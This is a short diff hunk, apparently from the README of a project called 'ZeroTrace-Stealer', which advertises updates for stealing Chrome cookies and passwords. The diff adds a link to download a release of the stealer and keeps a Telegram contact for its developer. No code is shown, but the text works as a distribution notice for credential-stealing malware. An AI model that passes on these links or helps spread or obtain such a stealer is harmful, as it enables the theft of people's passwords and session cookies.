@@ -9,7 +9,7 @@ Updated To Latest Chrome Cookies/Passwords
 
 
 
-
+Download Release: https://github.com/luis22d/ZeroTrace-Stealer-13-2026/releases/tag/zerotrace13
 Contact TG : https://t.me/ZeroTraceDevOfficial
 
 <p align="center">
